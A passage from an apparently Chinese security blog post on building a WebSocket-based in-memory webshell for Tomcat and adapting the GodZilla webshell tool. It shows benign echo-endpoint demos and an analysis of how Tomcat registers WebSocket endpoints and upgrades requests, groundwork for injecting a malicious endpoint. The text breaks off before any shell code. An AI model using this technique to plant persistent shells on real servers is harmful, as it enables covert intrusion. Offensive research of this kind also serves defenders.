<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="前言六月初写的了，当时正在做webshell相关的工作，刚好看到stoocea师傅发的文章，便也有了自己实现一个WebSocket版本GodZilla的想法。 WebSocket 是一种基于 TCP 协议的全双工通信协议。相比于Http单向请求——响应模式，WebSocket允许客户端和服务器可同时发送和接收数据，无需等待对方请求。当然​，在握手阶段任然使用Http协议，发送升级请求后得到对方的同">
<meta property="og:type" content="article">
<meta property="og:title" content="WebSocket内存马及GodZilla二次开发">
<meta property="og:url" content="http://example.com/2025/06/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87%E2%80%94%E2%80%94WebSocket%E5%86%85%E5%AD%98%E9%A9%AC%E5%8F%8AGodZilla%E4%BA%8C%E5%BC%80/index.html">
<meta property="og:site_name" content="cmisl_破站">
<meta property="og:description" content="前言六月初写的了，当时正在做webshell相关的工作，刚好看到stoocea师傅发的文章，便也有了自己实现一个WebSocket版本GodZilla的想法。 WebSocket 是一种基于 TCP 协议的全双工通信协议。相比于Http单向请求——响应模式，WebSocket允许客户端和服务器可同时发送和接收数据，无需等待对方请求。当然​，在握手阶段任然使用Http协议，发送升级请求后得到对方的同">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250604174605834.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250612142458788.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250612142132824.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250612143403426.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250612144136550.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250612145059087.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250612145631484.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250612150525918.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250613131319357.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250612153115263.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250612164119246.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250612164354423.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250613122310834.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250613132115935.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250613151926262.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250613155506421.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250625104814403.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250625153025466.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250625153036197.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250625153053566.png">
<meta property="article:published_time" content="2025-06-03T16:00:00.000Z">
<meta property="article:modified_time" content="2025-07-16T03:58:32.876Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250604174605834.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>WebSocket内存马及GodZilla二次开发</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">首页</a></li><!--
     --><!--
       --><li><a href="/about/">关于</a></li><!--
     --><!--
       --><li><a href="/archives/">归档</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/cmisl">项目</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="上一篇" href="/2025/06/10/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87%E2%80%94%E2%80%94WebFlux%E5%9E%8B/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="下一篇" href="/2025/05/20/%E5%93%A5%E6%96%AF%E6%8B%89%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/06/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87%E2%80%94%E2%80%94WebSocket%E5%86%85%E5%AD%98%E9%A9%AC%E5%8F%8AGodZilla%E4%BA%8C%E5%BC%80/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/06/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87%E2%80%94%E2%80%94WebSocket%E5%86%85%E5%AD%98%E9%A9%AC%E5%8F%8AGodZilla%E4%BA%8C%E5%BC%80/&text=WebSocket内存马及GodZilla二次开发"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/06/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87%E2%80%94%E2%80%94WebSocket%E5%86%85%E5%AD%98%E9%A9%AC%E5%8F%8AGodZilla%E4%BA%8C%E5%BC%80/&title=WebSocket内存马及GodZilla二次开发"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/06/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87%E2%80%94%E2%80%94WebSocket%E5%86%85%E5%AD%98%E9%A9%AC%E5%8F%8AGodZilla%E4%BA%8C%E5%BC%80/&is_video=false&description=WebSocket内存马及GodZilla二次开发"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=WebSocket内存马及GodZilla二次开发&body=Check out this article: http://example.com/2025/06/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87%E2%80%94%E2%80%94WebSocket%E5%86%85%E5%AD%98%E9%A9%AC%E5%8F%8AGodZilla%E4%BA%8C%E5%BC%80/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/06/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87%E2%80%94%E2%80%94WebSocket%E5%86%85%E5%AD%98%E9%A9%AC%E5%8F%8AGodZilla%E4%BA%8C%E5%BC%80/&title=WebSocket内存马及GodZilla二次开发"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/06/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87%E2%80%94%E2%80%94WebSocket%E5%86%85%E5%AD%98%E9%A9%AC%E5%8F%8AGodZilla%E4%BA%8C%E5%BC%80/&title=WebSocket内存马及GodZilla二次开发"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/06/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87%E2%80%94%E2%80%94WebSocket%E5%86%85%E5%AD%98%E9%A9%AC%E5%8F%8AGodZilla%E4%BA%8C%E5%BC%80/&title=WebSocket内存马及GodZilla二次开发"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/06/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87%E2%80%94%E2%80%94WebSocket%E5%86%85%E5%AD%98%E9%A9%AC%E5%8F%8AGodZilla%E4%BA%8C%E5%BC%80/&title=WebSocket内存马及GodZilla二次开发"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/06/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87%E2%80%94%E2%80%94WebSocket%E5%86%85%E5%AD%98%E9%A9%AC%E5%8F%8AGodZilla%E4%BA%8C%E5%BC%80/&name=WebSocket内存马及GodZilla二次开发&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/06/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87%E2%80%94%E2%80%94WebSocket%E5%86%85%E5%AD%98%E9%A9%AC%E5%8F%8AGodZilla%E4%BA%8C%E5%BC%80/&t=WebSocket内存马及GodZilla二次开发"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#WebSocket%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.1.</span> <span class="toc-text">WebSocket内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ServerEndpoint%E6%B3%A8%E8%A7%A3%E5%AE%9E%E7%8E%B0"><span class="toc-number">1.1.1.</span> <span class="toc-text">ServerEndpoint注解实现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#javax-websocket-Endpoint%E7%BB%A7%E6%89%BF%E5%AE%9E%E7%8E%B0"><span class="toc-number">1.1.2.</span> <span class="toc-text">javax.websocket.Endpoint继承实现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9D%E5%A7%8B%E5%8C%96%E6%B5%81%E7%A8%8B"><span class="toc-number">1.1.3.</span> <span class="toc-text">初始化流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9E%E6%8E%A5%E6%B5%81%E7%A8%8B"><span class="toc-number">1.1.4.</span> <span class="toc-text">连接流程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E9%80%A0ServerEndpointConfig%E5%AE%9E%E4%BE%8B"><span class="toc-number">1.1.4.1.</span> <span class="toc-text">构造ServerEndpointConfig实例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96WsServerContainer"><span class="toc-number">1.1.4.2.</span> <span class="toc-text">获取WsServerContainer</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E5%86%99%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.2.</span> <span class="toc-text">编写内存马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E4%BA%8C%E5%BC%80"><span class="toc-number">1.3.</span> <span class="toc-text">工具二开</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%93%A5%E6%96%AF%E6%8B%89"><span class="toc-number">1.3.1.</span> <span class="toc-text">哥斯拉</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#WebSocket%E9%80%9A%E4%BF%A1%E7%B1%BB"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">WebSocket通信类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%8F%E9%A9%AC"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">小马</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Base64%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.3.1.2.1.</span> <span class="toc-text">Base64类型</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Raw%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.3.1.2.2.</span> <span class="toc-text">Raw类型</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95"><span class="toc-number">1.3.1.3.</span> <span class="toc-text">测试</span></a></li></ol></li></ol></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        WebSocket内存马及GodZilla二次开发
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">cmisl</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-06-03T16:00:00.000Z" class="dt-published" itemprop="datePublished">2025-06-04</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>六月初写的了，当时正在做webshell相关的工作，刚好看到stoocea师傅发的文章，便也有了自己实现一个WebSocket版本GodZilla的想法。</p>
<p>WebSocket 是一种基于 TCP 协议的全双工通信协议。相比于Http单向请求——响应模式，WebSocket允许客户端和服务器可同时发送和接收数据，无需等待对方请求。当然​，在握手阶段任然使用Http协议，发送升级请求后得到对方的同意升级响应后，后续便可直接使用Websocket协议交流。</p>
<p>如果想了解更多关于WebSocket的知识可以参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_36586120/article/details/120025498">WebSocket通信原理和在Tomcat中实现源码详解（万字爆肝）_tomcat websockt 源码分析-CSDN博客</a></p>
<p>从中可以了解到如果想要注入一个WebSocket类型的内存马需要对面中间件条件是：支持JSR356规范（如Tomcat 7.0.47+、Jetty 9.4+）</p>
<h2 id="WebSocket内存马"><a href="#WebSocket内存马" class="headerlink" title="WebSocket内存马"></a>WebSocket内存马</h2><p>与其他Valve、Filter等内存马一样，我们同样需要动态注册某个组件进去，在这里就是服务端端点(Endpoint)。如果我们要制作一个恶意的Endpoint，可以通过以下两种方式：</p>
<ul>
<li>标注注解@ServerEndpoint</li>
<li>继承抽象类javax.websocket.Endpoint</li>
</ul>
<p>我们先来用ServerEdnpoint注解实现一个WebSocket的Demo。</p>
<h3 id="ServerEndpoint注解实现"><a href="#ServerEndpoint注解实现" class="headerlink" title="ServerEndpoint注解实现"></a>ServerEndpoint注解实现</h3><p>通过<code>@ServerEndpoint</code>注解标记WebSocket服务端点类。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cmisl;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.websocket.*;  </span><br><span class="line"><span class="keyword">import</span> javax.websocket.server.ServerEndpoint;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@ServerEndpoint(&quot;/ws&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebSocketDemo</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@OnOpen</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onOpen</span><span class="params">(Session session)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;WebSocket连接建立: &quot;</span> + session.getId());  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@OnMessage</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onMessage</span><span class="params">(String message, Session session)</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="comment">// 回显接收到的消息  </span></span><br><span class="line">            session.getBasicRemote().sendText(<span class="string">&quot;ECHO: &quot;</span> + message);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@OnClose</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClose</span><span class="params">(Session session)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;WebSocket连接关闭: &quot;</span> + session.getId());  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@OnError</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onError</span><span class="params">(Session session, Throwable error)</span> &#123;  </span><br><span class="line">        error.printStackTrace();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250604174605834.png"></p>
<p>上面就是一个Websocket的demo了，同样的，类似Filter的doFilter和Listener的requestInitialized，WebSocket同样需要实现一套自己的生命周期方法。如图分别是@OpOpen、@OnMessage、@OnError、@OnError。从名字上看也不难理解，下面是对应的介绍：</p>
<p><code>@OnOpen</code></p>
<ul>
<li><strong>触发时机</strong>​：客户端与服务端完成握手后调用，仅执行一次。</li>
<li><strong>功能</strong>​：初始化会话资源，记录连接时间等。</li>
</ul>
<p><code>@OnMessage</code></p>
<ul>
<li><strong>触发时机</strong>​：接收到客户端发送的消息时调用。</li>
<li><strong>功能</strong>​：处理文本、二进制或 Pong 消息，支持异步响应。</li>
</ul>
<p><code>@OnError</code></p>
<ul>
<li><strong>触发时机</strong>​：连接或端点发生异常时调用。</li>
<li><strong>功能</strong>​：捕获未处理的异常，防止服务崩溃，记录日志或发送错误通知。</li>
</ul>
<p><code>@OnClose</code></p>
<ul>
<li><strong>触发时机</strong>​：连接关闭时调用（无论主动或被动关闭）。</li>
<li><strong>功能</strong>​：释放资源、记录日志或发送最终通知。</li>
</ul>
<h3 id="javax-websocket-Endpoint继承实现"><a href="#javax-websocket-Endpoint继承实现" class="headerlink" title="javax.websocket.Endpoint继承实现"></a>javax.websocket.Endpoint继承实现</h3><p>需要实现<code>implements MessageHandler.Whole&lt;String&gt;</code>，以获取onMessage方法。或者只继承Endpoint类然后在onOpen中为session添加一个MessageHandler来注册消息处理器，本质没有区别。</p>
<p>此外消息处理一般除了String还可以用ByteBuffer来处理二进制消息。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cmisl;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.websocket.Endpoint;  </span><br><span class="line"><span class="keyword">import</span> javax.websocket.EndpointConfig;  </span><br><span class="line"><span class="keyword">import</span> javax.websocket.Session;  </span><br><span class="line"><span class="keyword">import</span> javax.websocket.MessageHandler;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyWebSocketEndpoint</span> <span class="keyword">extends</span> <span class="title class_">Endpoint</span> <span class="keyword">implements</span> <span class="title class_">MessageHandler</span>.Whole&lt;String&gt; &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> Session session;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onOpen</span><span class="params">(Session session, EndpointConfig config)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;WebSocket opened: &quot;</span> + session.getId());  </span><br><span class="line">        <span class="built_in">this</span>.session = session;  </span><br><span class="line">        session.addMessageHandler(<span class="built_in">this</span>); </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onMessage</span><span class="params">(String message)</span> &#123;  </span><br><span class="line">        handleMessage(message);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">handleMessage</span><span class="params">(String message)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;Received message: &quot;</span> + message);  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            session.getBasicRemote().sendText(<span class="string">&quot;Echo: &quot;</span> + message);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClose</span><span class="params">(Session session, javax.websocket.CloseReason closeReason)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;WebSocket closed: &quot;</span> + session.getId());  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onError</span><span class="params">(Session session, Throwable thr)</span> &#123;  </span><br><span class="line">        System.err.println(<span class="string">&quot;WebSocket error on session &quot;</span> + session.getId() + <span class="string">&quot;: &quot;</span> + thr.getMessage());  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="初始化流程"><a href="#初始化流程" class="headerlink" title="初始化流程"></a>初始化流程</h3><p>Apache Tomcat中用于启动Web应用上下文会调用到 <code>standardContext.startInternal</code> 方法，负责初始化一些Web应用的组件和资源，比如Servlet、Filter、Listener，因此在Tomcat型内存马的时候也会提及该方法。这个方法中会触发 <code>ServletContainerInitializers</code> 初始化。然后调用<code>ServletContainerInitializer</code> 接口的 <code>onStartup()</code>方法，它是 Java EE &#x2F; Jakarta EE 规范中的标准机制，用于在 Web 应用启动时执行一些自定义的初始化逻辑，框架（如 Spring、WebSocket、Jersey 等）就会利用它进行自动配置和初始化。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250612142458788.png"></p>
<p>Tomcat中的WebSocket就是基于此机制实现的。在Tomcat的jar包中，包含文件<code>META-INF/services/javax.servlet.ServletContainerInitializer</code>。内容指向<code>org.apache.tomcat.websocket.server.WsSci</code>，当 Tomcat 启动 web 应用时，Servlet 容器会通过 SPI（Service Provider Interface）发现并加载所有的 <code>ServletContainerInitializer</code> 实现。其中就包括WsSci，因此在上面提到的过程中就会调用到WsSci的onStartup方法中。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250612142132824.png"></p>
<p>首先会初始化一个WebSocket容器，然后筛选WebSocket组件，包括通过配置定义、继承Endpoint、@ServerEndpoint注解的WebSocket服务端点。然后将筛选出来的类添加到WebSocket容器中。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250612143403426.png"></p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250612144136550.png"></p>
<h3 id="连接流程"><a href="#连接流程" class="headerlink" title="连接流程"></a>连接流程</h3><p>WebSocket连接开始还是Http请求，如下图：</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250612145059087.png"></p>
<p>请求发给Tomcat时，Tomcat会有一个过滤器，WsFilter。这个过滤器是Tomcat用于将普通的HTTP请求升级为WebSocket请求的组件。<br>简而言之：</p>
<blockquote>
<p> HTTP 请求 →  <code>WsFilter</code> 判断是否是 WebSocket 请求 →  发起升级协议（HTTP ➝ WebSocket） →  建立 WebSocket 连接</p>
</blockquote>
<p>首先就是if判断，this.sc.areEndpointsRegistered()会先判断WebSocket容器中是否存在服务端点ServerEndPoint组件注册，后续在继续深入这个方法，这里并非一定要有组件才会返回true，有相关配置也是可以的。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250612145631484.png"></p>
<p>第二个判断是isWebSocketUpgradeRequest方法判断该请求是否是WebSocket升级请求，代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isWebSocketUpgradeRequest</span><span class="params">(ServletRequest request, ServletResponse response)</span> &#123;  </span><br><span class="line">    <span class="keyword">return</span> request <span class="keyword">instanceof</span> HttpServletRequest &amp;&amp; response <span class="keyword">instanceof</span> HttpServletResponse &amp;&amp; headerContainsToken((HttpServletRequest)request, <span class="string">&quot;Upgrade&quot;</span>, <span class="string">&quot;websocket&quot;</span>) &amp;&amp; <span class="string">&quot;GET&quot;</span>.equals(((HttpServletRequest)request).getMethod());  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>我们需要两个判断都为true，这样才能进入if代码中升级请求。<code>isWebSocketUpgradeRequest</code>这个判断很容易理解，也很容易构造，正常的HTTP的Get请求+Upgrade: websocket请求头即可。因此我们关注点可以看到第一个判断中。</p>
<p>第一个判断返回的是WebSocket容器的<code>endpointsRegistered</code>属性，这个属性默认是false，如果要返回true，只有在<code>addEndPoint</code>方法中才会将其设置为true。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250612150525918.png"></p>
<p>这里有两个参数，</p>
<blockquote>
